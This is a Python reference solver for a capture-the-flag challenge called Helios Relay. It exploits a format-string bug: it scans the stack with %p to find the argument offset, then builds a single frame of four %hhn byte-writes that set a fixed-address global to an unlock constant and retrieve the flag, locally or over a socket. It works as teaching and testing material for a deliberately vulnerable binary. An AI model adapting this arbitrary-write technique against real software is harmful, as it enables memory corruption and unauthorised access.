#!/usr/bin/env python3
"""
ZSCTF :: Helios Relay -- reference solver (no pwntools; stdlib only).

Intended path (everything needed is in the published source + build recipe):

  1. The relay renders an operator-supplied *label template* by handing it
     straight to the C line formatter, so the template IS the format string.
     Supplying `%p` conversions walks the stack; supplying `%n`-family
     conversions turns reads into writes.

  2. The control plane latches on a single 32-bit global, `authorization_level`.
     The binary is built -no-pie, so that global sits at a FIXED address which
     we read out of the ELF symbol table (readelf/nm). The relay must observe
     it equal to the provisioning seal (a fixed constant in the source).

  3. Because .bss addresses contain NUL bytes, a text line would be truncated;
     the relay instead takes length-framed `RENDER <len>` frames that preserve
     every byte, so we can embed the four target addresses (&word .. &word+3)
     verbatim and drive four `%hhn` byte-writes in a single frame -- defeating
     the "any wrong value relatches to LOCKED" tripwire, which blocks the naive
     byte-at-a-time staging across frames.

  4. The template buffer's position in the render frame is perturbed per team
     (ZSCTF_SEED), so the stack argument offset is discovered at run time with
     a `%p` scan rather than hard-coded.

Run against the local binary:   python3 solve.py --local ./helios_relay
Run against a deployment:       python3 solve.py --remote HOST PORT --bin ./helios_relay
"""
import sys, subprocess, socket, argparse, re

# Provisioning seal: the fixed 32-bit constant PROVISIONING_SEAL in the source
# (challenge/helios_relay.c). The control plane unlocks iff authorization_level
# equals exactly this value.
SEAL = 0x5A534331
PREFIX_LEN = 64          # fixed, 8-aligned directive region; addresses follow it
SYMBOL = "authorization_level"


# ---- locate the target global in the (fixed-address, -no-pie) binary --------
def symbol_addr(binary):
    for tool, pat in (
        (["readelf", "-sW", binary], None),
        (["nm", binary], None),
    ):
        try:
            out = subprocess.run(tool, capture_output=True, text=True, timeout=30).stdout
        except (OSError, subprocess.SubprocessError):
            continue
        for line in out.splitlines():
            if SYMBOL in line.split():
                # readelf: "   45: 00000000004040ac  4 OBJECT GLOBAL ... authorization_level"
                # nm:      "00000000004040ac B authorization_level"
                m = re.search(r"\b([0-9a-fA-F]{6,16})\b", line)
                if m:
                    return int(m.group(1), 16)
    raise RuntimeError("could not resolve %s from %s" % (SYMBOL, binary))


# ---- transports -------------------------------------------------------------
class Proc:
    def __init__(self, path):
        self.p = subprocess.Popen([path], stdin=subprocess.PIPE,
                                  stdout=subprocess.PIPE)
    def send(self, data): self.p.stdin.write(data); self.p.stdin.flush()
    def recv1(self):
        b = self.p.stdout.read(1)
        return b
    def close(self):
        try: self.p.stdin.close()
        except Exception: pass
        try: self.p.wait(timeout=5)
        except Exception: self.p.kill()

class Sock:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=15)
        self.s.settimeout(8)
    def send(self, data): self.s.sendall(data)
    def recv1(self):
        try:
            return self.s.recv(1)
        except socket.timeout:
            return b""              # quiet socket -> treat as end of stream
    def close(self):
        try: self.s.close()
        except Exception: pass


def recvuntil(io, token, cap=1 << 20):
    buf = b""
    while token not in buf:
        c = io.recv1()
        if not c:
            break
        buf += c
        if len(buf) > cap:
            break
    return buf

def recv_all(io, cap=1 << 20):
    buf = b""
    while True:
        c = io.recv1()
        if not c:
            break
        buf += c
        if len(buf) > cap:
            break
    return buf


def render(io, frame):
    io.send(b"RENDER %d\n" % len(frame))
    io.send(frame)


# ---- offset discovery: find the arg index where our frame begins ------------
def find_offset(io):
    probe = b"AAAAAAAA" + b"".join(b".%p" for _ in range(40))
    render(io, probe)
    recvuntil(io, b"rendered label: ")
    line = recvuntil(io, b"\n").decode("latin-1")
    parts = line.split(".")
    # parts[0] == "AAAAAAAA"; parts[k] is the k-th stack arg (sequential %p)
    for k in range(1, len(parts)):
        if parts[k].strip().lower() == "0x4141414141414141":
            return k
    raise RuntimeError("offset marker not found in: %r" % line)


# ---- build the four-byte arbitrary write ------------------------------------
def build_write(off, addr, value):
    want = [(value >> (8 * i)) & 0xFF for i in range(4)]
    slot0 = off + PREFIX_LEN // 8
    targets = [(want[i], slot0 + i) for i in range(4)]
    order = sorted(range(4), key=lambda i: targets[i][0])
    directives, printed = "", 0
    for i in order:
        bval, idx = targets[i]
        delta = (bval - printed) % 256
        if delta == 0:
            delta = 256               # keep %c non-empty; low 8 bits still land
        directives += "%%%dc%%%d$hhn" % (delta, idx)
        printed += delta
    if len(directives) > PREFIX_LEN:
        raise RuntimeError("directive region overflow (%d > %d)" %
                           (len(directives), PREFIX_LEN))
    prefix = directives.encode() + b" " * (PREFIX_LEN - len(directives))
    addrs = b"".join((addr + i).to_bytes(8, "little") for i in range(4))
    return prefix + addrs


def solve(io, addr):
    recvuntil(io, b"relay> ")
    off = find_offset(io)
    recvuntil(io, b"relay> ")
    payload = build_write(off, addr, SEAL)
    render(io, payload)
    tail = recv_all(io)
    text = tail.decode("latin-1")
    m = re.search(r"(zerosecurectf\{[^}\n]*\})", text)
    return off, (m.group(1) if m else None), text


def main():
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--local", metavar="BINARY")
    g.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    ap.add_argument("--bin", metavar="BINARY",
                    help="binary to resolve the target symbol from (required for --remote)")
    args = ap.parse_args()

    binary = args.local if args.local else args.bin
    if not binary:
        ap.error("--remote requires --bin <binary> to resolve the target address")
    addr = symbol_addr(binary)
    print("[*] %s @ 0x%x" % (SYMBOL, addr))
    print("[*] provisioning seal = 0x%08x" % SEAL)

    io = Proc(args.local) if args.local else Sock(args.remote[0], int(args.remote[1]))
    try:
        off, flag, _ = solve(io, addr)
        print("[*] discovered stack arg offset = %d" % off)
        if flag:
            print("[+] control plane unlocked")
            print("[+] FLAG =", flag)
            return 0
        print("[-] no flag recovered")
        return 1
    finally:
        io.close()


if __name__ == "__main__":
    sys.exit(main())
